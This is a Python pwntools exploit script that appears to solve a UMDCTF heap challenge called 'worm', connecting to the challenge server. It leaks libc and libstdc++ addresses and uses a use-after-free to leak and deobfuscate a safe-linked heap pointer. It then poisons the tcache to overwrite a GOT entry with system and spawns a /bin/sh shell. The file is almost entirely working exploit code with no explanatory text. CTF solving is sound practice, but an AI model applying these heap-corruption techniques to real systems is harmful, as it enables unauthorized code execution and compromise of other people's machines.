from pwn import *
from icecream import ic
import tty

# Set up pwntools for the correct architecture
exe = "./worm"
libc = ELF("./libc.so.6")
libcpp = ELF("./libstdc++.so.6")
context.binary = elf = ELF(exe)
context.log_level = "debug"
context.aslr = True

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.REMOTE:
        return remote("challs.umdctf.io", 31818)
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

gdbscript = '''
    c
'''.format(**locals())

# Useful macros
def sl(a): return r.sendline(a)
def s(a): return r.send(a)
def sa(a, b): return r.sendafter(a, b)
def sla(a, b): return r.sendlineafter(a, b)
def re(a): return r.recv(a)
def ru(a): return r.recvuntil(a)
def rl(): return r.recvline()
def i(): return r.interactive()
eof = chr(tty.CEOF)

def new(name):
    sl(b"1")
    sla(b"worm name: ", name)

def eat(x, y):
    sl(b"2")
    sla(b"be the eater? \n", str(x).encode())
    sla(b"want to eat? \n", str(y).encode())

def rename(ind, name):
    sl(b"3")
    sla(b"want to rename? ", str(ind).encode())
    sla(b"Enter your string: ", name)

def get(ind):
    sl(b"4")
    sla(b"want to get? ", str(ind).encode())

def deobfuscate(val):
    mask = 0xfff << 52
    while mask:
        v = val & mask
        val ^= (v >> 12)
        mask >>= 12
    return val

def enc(val):
    return (heap>>12) ^ val

r = start()

ru(b"Free leak: ")
libc.address = int(rl().strip(), 16) - 0x1feac0
ru(b"Free leak: ")
libcpp = int(rl().strip(), 16)

new(b"JUNKJUNK")

# UAF
eat(0, 0)
get(0)
heap = u64(rl().strip()+b"\0\0") 
heap = deobfuscate(heap) - 0x12360 + 0x123d0
ic(hex(heap))

# Exploit
rename(0, p64(0)*2)
eat(0, 0)

freegot = libcpp + 0x3920

rename(0, p64(enc(freegot-16)))
new(b"/bin/sh\0"*2 + p64(libc.sym.system))


r.interactive()
